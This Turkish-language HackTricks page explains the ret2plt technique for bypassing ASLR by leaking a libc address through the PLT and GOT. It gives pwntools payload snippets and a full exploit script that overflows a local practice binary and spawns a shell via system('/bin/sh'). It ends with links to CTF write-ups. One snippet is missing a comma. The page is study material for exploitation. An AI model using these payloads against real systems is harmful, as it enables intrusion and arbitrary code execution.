# Ret2plt

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

Bu teknikteki amaç, **PLT'den bir işlevin adresini sızdırmak** ve ASLR'yi atlamak için kullanmaktır. Örneğin, libc'ten `puts` işlevinin adresini sızdırırsanız, daha sonra **`libc`'nin başlangıç adresini hesaplayabilir** ve diğer işlevlere erişmek için **`system`** gibi işlevlere erişmek için ofsetler hesaplayabilirsiniz.

Bu, `pwntools` yüküyle şu şekilde yapılabilir ([**buradan**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
**`puts`** (PLT'dan alınan adresi kullanarak) `GOT` içinde bulunan `puts` adresi ile çağrılır. Bu, `puts` `GOT` girdisini yazdırdığında, bu girdinin bellekteki `puts` adresini içereceği için geçerlidir.

Ayrıca, söz konusu açığı kullanırken `main`in adresinin nasıl kullanıldığına dikkat edin, böylece `puts` işlemini bitirdiğinde **binary çıkış yapmak yerine `main`i tekrar çağırır** (bu nedenle sızdırılan adres geçerli olmaya devam eder).

{% hint style="danger" %}
Bu işin çalışması için, **binary'nin PIE ile derlenmemiş olması** veya `PLT`, `GOT` ve `main` adreslerini bilmek için **PIE'yi atlamak için bir sızıntı bulmuş olmanız gerekmektedir**.
{% endhint %}

Bu atlamayı [**burada tam bir örnekte bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Bu, örneğin son saldırısıydı:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Diğer örnekler ve Referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ancak PIE yok, ilk adım canary'nin 0x00 byte'ına sızıntı yapmak için bir taşma doldurmaktır. Ardından puts'u çağırmak ve sızdırmak için. Canary ile puts'un adresini sızdırmak için GOT'tan ve ardından `system('/bin/sh')` çağırmak için bir ROP aracı oluşturulur.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, canary yok, ana fonksiyondan bir çocuk fonksiyonundan yığın taşması. Puts'u çağırmak için ROP aracı, GOT'tan puts'un adresini sızdırmak ve ardından bir tek araç çağırmak için.
